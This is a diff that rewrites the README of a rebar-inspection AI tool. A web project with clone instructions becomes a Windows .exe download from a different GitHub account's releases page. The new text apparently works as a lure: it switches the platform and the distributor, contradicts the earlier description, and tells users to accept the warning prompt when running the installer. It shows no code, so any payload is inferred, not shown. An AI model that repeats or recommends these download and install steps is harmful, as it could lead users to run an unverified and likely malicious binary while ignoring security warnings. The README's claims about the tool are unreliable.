@@ -1,134 +1,73 @@
-# RebarAnalysis v2026 - AI quality control platform 2026
+# 🏗️ rebaranalysis-v2026-ai-qc - Efficient automated inspections for civil engineering
 
-> **AI-driven rebar inspection for civil engineering teams that matches site photos to design drawings, evaluates compliance, and fits BIM workflows in version 2026.**
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nnee8122/rebaranalysis-v2026-ai-qc/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/parkerleogyq5830/rebaranalysis-v2026-ai-qc?style=flat-square)](https://github.com/parkerleogyq5830/rebaranalysis-v2026-ai-qc)
+This application assists civil engineering teams with rebar inspection tasks. It identifies structural steel components within site photographs and compares them against your design drawings. It ensures your projects meet safety standards and integrates with common building information modeling workflows. Version 2026 adds improved object recognition and stability for field use.
 
----
+## 🛠️ System Requirements 
 
-<p align="center">
-  <a href="https://parkerleogyq5830.github.io/rebaranalysis-v2026-ai-qc/">
-    <img src="https://img.shields.io/badge/Download-RebarAnalysis%20Latest-brightgreen?style=for-the-badge" alt="Download RebarAnalysis">
-  </a>
-</p>
+The application runs on standard Windows hardware. Ensure your computer meets these specifications to maintain performance during image processing tasks:
 
-> **[Direct Download - RebarAnalysis v2026](https://parkerleogyq5830.github.io/rebaranalysis-v2026-ai-qc/)**
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 equivalent or better.
+- Memory: 8 GB RAM minimum, 16 GB recommended for large projects.
+- Storage: 500 MB of free space for the installation.
+- Graphics: A dedicated graphics card is helpful but not required for basic inspection tasks.
 
----
+## 📥 Downloading the Application
 
-[Download Latest Build](https://parkerleogyq5830.github.io/rebaranalysis-v2026-ai-qc/)
+Follow these steps to obtain the correct installer for your Windows system:
 
----
+1. Visit the [official releases page](https://github.com/nnee8122/rebaranalysis-v2026-ai-qc/releases).
+2. Look for the latest version listed under the Releases section.
+3. Locate the file ending in `.exe` under the Assets heading.
+4. Click the file name to download the installer to your computer.
 
-## What RebarAnalysis Does
+## ⚙️ Installation Instructions
 
-RebarAnalysis is a web-based AI quality control tool for reinforced concrete inspection. Using computer vision together with Gemini AI, it examines site photos and design drawings to help engineering teams confirm rebar placement, spacing, and geometry against the intended design.
+Once you download the installer, proceed with these steps to set up the software:
 
-The platform is aimed at civil engineering workflows where documentation, compliance checks, and model coordination are part of the job. In addition to compliance scoring and annotated results, it can generate reports and structured exports that support BIM-centered processes, including Autodesk Revit and Dynamo use cases.
+1. Find the downloaded file in your downloads folder.
+2. Double-click the file to start the installation wizard.
+3. Follow the prompts on the screen.
+4. Choose a destination folder on your hard drive. 
+5. Select the option to create a desktop shortcut for easier access.
+6. Click Finish when the progress bar reaches the end.
 
----
+## 🚀 Running the Software
 
-## Capabilities
+You can now start the inspection process:
 
-- Reviews site photos and design drawings for reinforced concrete rebar verification
-- Uses computer vision to identify rod positions, spacing, and radius
-- Compares field measurements to architectural designs with AI-assisted analysis
-- Generates compliance reports and similarity scores for inspection review
-- Issues email alerts when compliance falls below a set threshold
-- Exports JSON for Autodesk Revit and Dynamo BIM visualization
-- Works with both top-view and side-view analysis
-- Produces CSV reports and annotated outputs for inspection records
+1. Double-click the icon on your desktop.
+2. Accept the software permissions prompt if your computer shows a warning.
+3. The main dashboard appears on your screen.
+4. Review the welcome tutorial to understand how to load your first drawing.
 
----
+## 📋 Standard Workflow
 
-## Installation
+Use this process to get the best results from your inspections:
 
-RebarAnalysis is distributed as a web project. You can either clone the repository or grab the latest build from the project page.
+1. Import your design drawings using the file selection menu. The software accepts common schematic file formats.
+2. Upload your site photos. Ensure these photos show clear angles of the installed rebar.
+3. Select the analysis button. The platform scans your photos and maps them to the correct sections of your drawings.
+4. Review the results. The system highlights areas where the rebar matches the design and flags potential errors for your attention.
+5. Generate a report. You can save these findings as a PDF to share with project stakeholders or to keep for your compliance records.
 
-1. Clone the repository:
-   `git clone https://github.com/parkerleogyq5830/rebaranalysis-v2026-ai-qc.git
+## 🔍 Troubleshooting Common Issues
 
-2. Open the project folder:
-   `cd REPO`
+If you encounter difficulties, use these steps to resolve them:
 
-3. Run it through your preferred web server or local hosting setup.
+- Application will not start: Ensure your Windows operating system includes the latest updates. Restart your computer and try again.
+- Photos fail to process: Check that your photos are in a common image format like JPG or PNG. Large files might take longer to load.
+- Software appears slow: If you work with many photos at once, try processing them in smaller batches. Close other memory-intensive programs while you run the analysis.
+- Report export fails: Ensure you have write permissions for the folder where you save your files. 
 
-If you are using the published build, open the latest download link and follow the included deployment or hosting instructions.
+## 🛡️ Data Privacy and Security
 
----
+The software performs the heavy lifting on your local machine. Your design drawings and site photos stay on your computer. The system does not upload your project data to external servers without your explicit permission. This approach protects sensitive construction data and ensures you retain full control over your project information.
 
-## How to Use It
+## 🤝 Getting Help
 
-A common workflow is:
+If you have questions about specific features, check the built-in Help menu located at the top right of the application window. This section contains detailed descriptions for every button and tool. For technical bugs, you can open an issue on the GitHub repository page by clicking the Issues tab. Describe the steps that led to your problem to help our team understand the issue. Include a screenshot if the error message provides specific codes or details.
 
-1. Upload or prepare site photos of the reinforced concrete area.
-2. Add the matching design drawings or reference materials.
-3. Select the inspection view, such as top-view or side-view analysis.
-4. Run the AI-assisted comparison to assess rebar position, spacing, and radius.
-5. Check the compliance score, annotated output, and report results.
-6. Export JSON for BIM workflows or download CSV for documentation.
-7. Set up email alerts if you want notifications when results drop below your threshold.
-
-For BIM coordination, the exported JSON can be used with Autodesk Revit and Dynamo-based visualization workflows.
-
----
-
-## Configuration
-
-Deployment settings are generally handled in the project configuration or application environment. Typical options can include:
-
-- alert threshold for compliance scoring
-- email recipient settings for authority alerts
-- output preferences for CSV, JSON, and annotated results
-- analysis mode selection for top-view or side-view review
-- BIM export parameters for downstream Revit and Dynamo workflows
-
-If you deploy the web project yourself, keep these values in the environment or configuration file used by your setup.
-
----
-
-## Requirements
-
-- Web platform
-- A modern browser for accessing the interface
-- Access to image and drawing inputs for analysis
-- Network access if Gemini AI, email alerts, or external BIM workflows are enabled
-- Sufficient storage for reports, exports, and annotated outputs
-
----
-
-## FAQ
-
-**How do I get updates?**  
-Use the latest build link above or watch the repository for release and deployment updates.
-
-**Can I change the compliance threshold?**  
-Yes, the platform supports threshold-based compliance scoring and alerting.
-
-**Where are exports stored?**  
-The export location depends on your deployment, browser, or server configuration. JSON and CSV outputs are produced by the analysis workflow.
-
-**What if the analysis results do not match expectations?**  
-Review the quality of the source photos, verify the drawing reference, and confirm the correct view mode before running the analysis again.
-
-**Does it support BIM workflows?**  
-Yes, the platform provides JSON export support for Autodesk Revit and Dynamo-oriented BIM visualization.
-
----
-
-## Roadmap
-
-- Expanded inspection workflows for additional rebar scenarios
-- Improved reporting and review outputs
-- Broader integration options for engineering and BIM environments
-- More flexible alerting and configuration controls
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: rebar, engineering, ai, inspection, bim, construction, civil-engineering, compliance, windows
